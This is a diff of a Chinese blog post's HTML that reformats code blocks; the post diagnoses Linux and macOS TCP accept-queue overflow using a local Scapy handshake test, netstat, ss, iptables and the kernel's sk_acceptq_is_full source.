-tcp<span style="color:#000;font-weight:bold">=</span>TCP(dport<span style="color:#000;font-weight:bold">=</span><span style="color:#099">8877</span>, flags<span style="color:#000;font-weight:bold">=</span><span style="color:#d14"></span><span style="color:#d14">&#34;</span><span style="color:#d14">S</span><span style="color:#d14">&#34;</span>)
-idx <span style="color:#000;font-weight:bold">=</span> <span style="color:#099">1</span>
 
-<span style="color:#000;font-weight:bold">def</span> <span style="color:#900;font-weight:bold">connect</span>():
-  <span style="color:#000;font-weight:bold">global</span> idx
-  ip<span style="color:#000;font-weight:bold">.</span>src <span style="color:#000;font-weight:bold">=</span> f<span style="color:#d14"></span><span style="color:#d14">&#34;</span><span style="color:#d14">127.0.0.{ idx }</span><span style="color:#d14">&#34;</span>
-  synack <span style="color:#000;font-weight:bold">=</span> sr1(ip<span style="color:#000;font-weight:bold">/</span>tcp)
-  ack <span style="color:#000;font-weight:bold">=</span> TCP(sport<span style="color:#000;font-weight:bold">=</span>synack<span style="color:#000;font-weight:bold">.</span>dport, dport<span style="color:#000;font-weight:bold">=</span>synack<span style="color:#000;font-weight:bold">.</span>sport, flags<span style="color:#000;font-weight:bold">=</span><span style="color:#d14"></span><span style="color:#d14">&#34;</span><span style="color:#d14">A</span><span style="color:#d14">&#34;</span>, seq<span style="color:#000;font-weight:bold">=</span><span style="color:#099">100</span>, ack<span style="color:#000;font-weight:bold">=</span>synack<span style="color:#000;font-weight:bold">.</span>seq <span style="color:#000;font-weight:bold">+</span> <span style="color:#099">1</span>)
-  send(ip<span style="color:#000;font-weight:bold">/</span>ack)
-  idx <span style="color:#000;font-weight:bold">+</span><span style="color:#000;font-weight:bold">=</span> <span style="color:#099">1</span>
-</code></pre></div><p>因为我们的 Server 从不 accept，所以，每次发起连接后，全连接队列就会添加一项。</p>
+<p>我们来测试一下，首先，关闭 <code>net.ipv4.tcp_abort_on_overflow</code>，启动我们的 <a href="https://gist.github.com/cj1128/e6620df2ea2e650164d7513b05c88c8c">simple-tcp-server</a>，<code>listen</code> 的 <code>backlog</code> 参数是 1，<code>somaxconn</code> 为 128，因此，全连接队列的长度为 1。</p>
+
+<p>使用 Scapy 定义 <code>connect</code> 函数，函数内部我们手动实现了三次握手。</p>
+
+<pre><code class="language-python">ip=IP(dst=&quot;127.0.0.1&quot;)
+tcp=TCP(dport=8877, flags=&quot;S&quot;)
+idx = 1
+
+def connect():
+  global idx
+  ip.src = f&quot;127.0.0.{ idx }&quot;
+  synack = sr1(ip/tcp)
+  ack = TCP(sport=synack.dport, dport=synack.sport, flags=&quot;A&quot;, seq=100, ack=synack.seq + 1)
+  send(ip/ack)
+  idx += 1
+</code></pre>
+
+<p>因为我们的 Server 从不 accept，所以，每次发起连接后，全连接队列就会添加一项。</p>
+
 <p>使用 <code>netstat -tn | rg 8877</code> 查看 Socket 状态，同时使用 <code>tcpdump -tn -i lo port 8877</code> 抓包，然后我们手动触发 <code>connect</code> 函数。</p>
+
 <p>第一次，多了一条 <code>ESTABLISHED</code> 的连接，一切正常。</p>
+
 <p>第二次，又多了一条 <code>ESTABLISHED</code> 的连接，这好像不太对了？</p>
+
 <p>第三次，多了一条 <code>SYN_RECV</code> 的连接，可以看到 Server 在不停的重发 SYN/ACK 包，对上了。</p>
+
 <p>再之后，不管怎么发起连接，都只有两个 <code>ESTABLISHED</code> 状态的连接，剩下的都是 <code>SYN_RECV</code>。</p>
+
 <p>问题来了，为什么是两个？全连接队列的长度是 1，应该只有 1 个才对。</p>
+
 <p>不停地修改 listen 参数测试会发现，<code>ESTABLISHED</code> 连接的数量始终是全连接队列长度 + 1，我们可以大胆猜测，内核判断的时候，用的是 <code>&gt;</code> 而不是 <code>&gt;=</code>。</p>
+
 <p>猜想归猜想，我更想验证一下，验证的方式只能是一头扎进 Linux 浩瀚的源码海洋里了。我运气很好，找到了检查全连接队列是否溢出的函数叫做 <code>sk_acceptq_is_full</code>，它的定义如下，这是 <a href="https://elixir.bootlin.com/linux/v3.5/source/include/net/sock.h#L669">在线版本</a>。</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-c" data-lang="c"><span style="color:#000;font-weight:bold">static</span> <span style="color:#000;font-weight:bold">inline</span> <span style="color:#458;font-weight:bold">bool</span> <span style="color:#900;font-weight:bold">sk_acceptq_is_full</span>(<span style="color:#000;font-weight:bold">const</span> <span style="color:#000;font-weight:bold">struct</span> sock <span style="color:#000;font-weight:bold">*</span>sk)
+
+<pre><code class="language-c">static inline bool sk_acceptq_is_full(const struct sock *sk)
 {
-  <span style="color:#000;font-weight:bold">return</span> sk<span style="color:#000;font-weight:bold">-</span><span style="color:#000;font-weight:bold">&gt;</span>sk_ack_backlog <span style="color:#000;font-weight:bold">&gt;</span> sk<span style="color:#000;font-weight:bold">-</span><span style="color:#000;font-weight:bold">&gt;</span>sk_max_ack_backlog;
+  return sk-&gt;sk_ack_backlog &gt; sk-&gt;sk_max_ack_backlog;
 }
-</code></pre></div><p><code>sk-&gt;sk_ack_backlog</code> 是当前的全连接队列长度，<code>sk-&gt;sk_max_ack_backlog</code> 是配置的全连接队列最大长度，猜想验证了。</p>
+</code></pre>
+
+<p><code>sk-&gt;sk_ack_backlog</code> 是当前的全连接队列长度，<code>sk-&gt;sk_max_ack_backlog</code> 是配置的全连接队列最大长度，猜想验证了。</p>
+
 <p>这里顺手提一下 <code>ss</code> 这个工具，一个现代化的用于取代 <code>netstat</code> 的工具，使用它，我们可以看到全连接队列的长度。</p>
-<p><img src="http://asset.cjting.cn/FqGFoNM8OPnt1J6xBfFN4k9pzDsj.png" alt=""></p>
+
+<p><img src="http://asset.cjting.cn/FqGFoNM8OPnt1J6xBfFN4k9pzDsj.png" alt="" /></p>
+
 <p>对于监听中的 Socket，<code>Recv-Q</code> 表示全连接队列当前的长度，<code>Send-Q</code> 表示全连接队列配置的长度。可以看到，对于 8877 端口，一个是 2，一个是 1。</p>
+
 <p>我们可以通过 <code>netstat -s | rg -i listen</code> 来得知因为全连接队列溢出导致的连接丢弃数量是多少。</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-bash" data-lang="bash">$ netstat -s | rg -i listen
-<span style="color:#099">20</span> <span style="color:#0086b3">times</span> the listen queue of a socket overflowed
-<span style="color:#099">2286</span> SYNs to LISTEN sockets dropped
-</code></pre></div><p>目前在我的机器上一共是 20 次。每次运行我们自己的 <code>connect</code> 函数，这个数字就会加一。</p>
+
+<pre><code class="language-bash">$ netstat -s | rg -i listen
+20 times the listen queue of a socket overflowed
+2286 SYNs to LISTEN sockets dropped
+</code></pre>
+
+<p>目前在我的机器上一共是 20 次。每次运行我们自己的 <code>connect</code> 函数，这个数字就会加一。</p>
+
 <p>开启 <code>net.ipv4.tcp_abort_on_overflow</code> 以后，系统会直接发送 RST 而不是忽略 ACK，这里我们要注意一下修改防火墙的规则。</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-bash" data-lang="bash">$ iptables -F OUTPUT <span style="color:#998;font-style:italic"># 清空所有规则</span>
-<span style="color:#998;font-style:italic"># 只阻止目标端口为 8877 的 RST 包</span>
-$ iptables -A OUTPUT -p tcp --tcp-flags RST RST --dport <span style="color:#099">8877</span> -j DROP
-</code></pre></div><p>使用 <code>connect</code> 函数我们会发现，Server 会返回一个 RST 包，同时也不存在 <code>SYN_RECV</code> 状态的连接。</p>
-<p><img src="http://asset.cjting.cn/FvB_BwUp1vO5BImwmJD5EJN6ymMX.png" alt=""></p>
+
+<pre><code class="language-bash">$ iptables -F OUTPUT # 清空所有规则
+# 只阻止目标端口为 8877 的 RST 包
+$ iptables -A OUTPUT -p tcp --tcp-flags RST RST --dport 8877 -j DROP
+</code></pre>
+
+<p>使用 <code>connect</code> 函数我们会发现，Server 会返回一个 RST 包，同时也不存在 <code>SYN_RECV</code> 状态的连接。</p>
+
+<p><img src="http://asset.cjting.cn/FvB_BwUp1vO5BImwmJD5EJN6ymMX.png" alt="" /></p>
+
 <h2 id="回到-mac">回到 Mac</h2>
+
 <p>最后，我们回到最开始的那个问题。</p>
+
 <p>为什么那段 Go 程序在 Mac 上报错了？我们可以猜测一下，应该是 Mac 的 <code>somaxconn</code> 参数比较小，导致全连接队列溢出，导致内核给新的连接发送了 RST 包。</p>
+
 <p>Mac 也有 sysctl 工具，但是如果我们直接把 Linux 的指令 <code>sysctl net.core.somaxconn</code> 搬上去会发现报错找不到配置项。</p>
+
 <p>我们来 <code>man</code> 一下 sysctl，文档里面没有提及 <code>somaxconn</code>，我们只能进一步再想想办法。</p>
+
 <p>文档中提到，sysctl 有一个相关的 C 头文件是 <code>&lt;sys/sysctl.h&gt;</code>，我们来打开这个头文件看看里面有什么。</p>
+
 <p>问题又来了，这个头文件在哪儿？在 Linux 上，我们可以猜一猜，比如 <code>/usr/include</code> 之类的，但是其实没有必要。编译器一定清楚头文件的路径，我们直接问编译器即可。</p>
+
 <p>我一般用如下的方式获取头文件的路径，写一小段程序，让编译器打印一个完整的头文件列表出来，我们要的路径自然会在这个列表当中。</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-bash" data-lang="bash"><span style="color:#0086b3">echo</span> <span style="color:#d14">&#34;#include &lt;sys/sysctl.h&gt;&#34;</span> | gcc -M -xc - | rg sysctl
-</code></pre></div><p>在我的 Mac 上，<code>&lt;sys/sysctl.h&gt;</code> 头文件位于 <code>/Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.14.sdk/usr/include/sys/sysctl.h</code>。</p>
+
+<pre><code class="language-bash">echo &quot;#include &lt;sys/sysctl.h&gt;&quot; | gcc -M -xc - | rg sysctl
+</code></pre>
+
+<p>在我的 Mac 上，<code>&lt;sys/sysctl.h&gt;</code> 头文件位于 <code>/Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.14.sdk/usr/include/sys/sysctl.h</code>。</p>
+
 <p>打开这个头文件，搜索 <code>somaxconn</code>，我们可以发现一个常量定义 <code>#define KIPC_SOMAXCONN</code>，再结合 sysctl 的 manual，我们可以知道，<code>somaxconn</code> 在 Mac 上的配置项名称是 <code>kern.ipc.somaxconn</code>。</p>
+
 <p>调整这个参数到 1000 以后 <code>sysctl kern.ipc.somaxconn=1000</code>，再运行我们的程序，Problem Gone。</p>
+
 <h2 id="参考">参考</h2>
+
 <ul>
 <li><a href="http://veithen.io/2014/01/01/how-tcp-backlog-works-in-linux.html">How TCP backlog works in Linux</a></li>
 <li><a href="https://my.oschina.net/moooofly/blog/666048">源码分析 TCP 协议中的 SYN queue 和 accept queue 处理</a></li>
